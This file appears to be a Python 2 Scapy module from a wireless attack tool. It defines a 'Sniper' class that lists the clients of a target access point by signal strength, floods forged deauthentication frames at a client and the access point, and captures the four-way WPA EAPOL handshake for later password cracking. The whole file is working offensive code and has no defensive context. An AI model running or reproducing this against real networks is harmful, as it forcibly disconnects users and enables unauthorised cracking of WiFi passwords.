
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.config import conf
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Raw
from scapy.layers.dot11 import Dot11Deauth
import signal
import sys
import time
import threading
import exceptions
import binascii
import os
try:
	from scapy.layers.dot11 import EAPOL
except ImportError:
	from scapy.layers.eap import EAPOL

class Sniper:

	__SNIFFER_STATUS = False
	__CONNECTECD_CL = {}
	__CL_COUNTER = {}
	__c_HANDSHAKE = [0, 0, 0, 0]
	__c_TGT = ''
	out__ = ['33:33:00:00:00:16', '33:33:ff:9d:df:fd', 'ff:ff:ff:ff:ff:ff', ]

	def __init__(self, iface_instance, bssid, essid, channel, timeout):
		self.iface_instance = iface_instance
		self.iface = self.iface_instance.iface
		self.bssid = bssid
		self.essid = essid
		self.ch = channel
		self.timeout = timeout
		self.channel_shifter = self.channel_shifter(self.ch)

	def __str__(self):
		return self.essid

	def channel_shifter(self, ch):
		self.iface_instance.stop_hopper = 1
		while not self.iface_instance._interface__STATUS_END:
			time.sleep(1)
		self.iface_instance.shift_channel(ch)

	def sniff_breaker(self, sig, frame):
		raise ValueError

	def cl_generator(self):
		signal.signal(signal.SIGINT, self.sniff_breaker)
		try:
			sniff(iface=self.iface, prn=self.cl_generator_replay, timeout=self.timeout)
		except ValueError:
			pass
		finally:
			signal.signal(signal.SIGINT, lambda sig, fr: sys.exit(-1))

	def cl_generator_replay(self, pkt):
		if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
			__sn = pkt.getlayer(Dot11).addr2
			__rc = pkt.getlayer(Dot11).addr1
			if __sn == self.bssid:
				try:
					if self.__CL_COUNTER[__rc] > 1:
						self.__CONNECTECD_CL[__rc] = self.dbM(pkt)
					else:
						self.__CL_COUNTER[__rc] += 1
				except KeyError:
					self.__CL_COUNTER[__rc] = 1
			elif __rc == self.bssid:
				try:
					if self.__CL_COUNTER[__sn] > 1:
						self.__CONNECTECD_CL[__sn] = self.dbM(pkt)
					else:
						self.__CL_COUNTER[__sn] += 1
				except KeyError:
					self.__CL_COUNTER[__sn] = 1

	def clients(self):
		pwr__ = []
		LIT__ = []
		for cl, pwr in self.__CONNECTECD_CL.items():
			pwr__.append(pwr)
		pwr__ = sorted(pwr__, reverse=True)
		for pwr in pwr__:
			for tuple_ in self.__CONNECTECD_CL.items():
				if tuple_[1] == pwr:
					if not tuple_[0].startswith('33:33:') or not tuple_[0].startswith('ff:ff:'):
						LIT__.append(tuple_)
		return LIT__

	def dbM(self, pkt):
		if pkt.haslayer(RadioTap):
			extra = pkt.notdecoded
			dbm_sig = -999
			for p in extra:
				if -(256-ord(p)) > -90 and -(256-ord(p)) < -20:
					dbm_sig = -(256-ord(p))
					break
			return dbm_sig

	def verify_handshake(self, tgt):
		if self.__c_TGT == tgt:
			if 0 not in self.__c_HANDSHAKE:
				if len(self.__c_HANDSHAKE):
					return 1
			else:
				return 0
		else:
			return 0

	def start_eapol_sniffer(self):
		try:
			self.__SNIFFER_STATUS = not bool(0)
			sniff(iface=self.iface, prn=self.eapol_sniffer_replay, timeout=20)
		except ValueError:
			pass
		finally:
			self.__SNIFFER_STATUS = not bool(1)

	def eapol_sniffer_replay(self, pkt):
		fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
		fMIC = "00000000000000000000000000000000"

		if pkt.haslayer(EAPOL):
			__sn = pkt[Dot11].addr2
			__rc = pkt[Dot11].addr1
			to_DS = pkt.getlayer(Dot11).FCfield & 0x1 !=0
			from_DS = pkt.getlayer(Dot11).FCfield & 0x2 !=0

			if __sn == self.bssid and __rc == self.__c_TGT:
				tgt = __rc
			elif __rc == self.bssid and __sn == self.__c_TGT:
				tgt = __sn
			else:
				return

			if from_DS == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __sn == self.bssid and __rc == tgt and nonce != fNONCE and mic == fMIC:
					self.__c_HANDSHAKE[0] = pkt
				elif __sn == self.bssid and __rc == tgt and nonce != fNONCE and mic != fMIC:
					self.__c_HANDSHAKE[2] = pkt
			elif to_DS == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __sn == tgt and __rc == self.bssid and nonce != fNONCE and mic != fMIC:
					self.__c_HANDSHAKE[1] = pkt
				elif __sn == tgt and __rc == self.bssid and nonce == fNONCE and mic != fMIC:
					self.__c_HANDSHAKE[3] = pkt
		return

	def shoot(self, tgt):
		self.__c_TGT = tgt
		sniffer_thread = threading.Thread(target=self.start_eapol_sniffer)
		sniffer_thread.daemon = True
		sniffer_thread.start()

		while not self.__SNIFFER_STATUS:
			time.sleep(1)

		__pkt_to_cl = RadioTap() / Dot11(addr1=tgt, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
		__pkt_to_ap = RadioTap() / Dot11(addr1=self.bssid, addr2=tgt, addr3=tgt) / Dot11Deauth(reason=7)

		for n in range(32 * 1):
			sendp(__pkt_to_cl, iface=self.iface, count=1, verbose=False)
			sendp(__pkt_to_ap, iface=self.iface, count=1, verbose=False)

		while self.__SNIFFER_STATUS:
			time.sleep(1)

		self.__SNIFFER_STATUS = not bool(self.__SNIFFER_STATUS)

		if self.verify_handshake(tgt):
			return (True, self.__c_HANDSHAKE)
		else:
			return (False, [])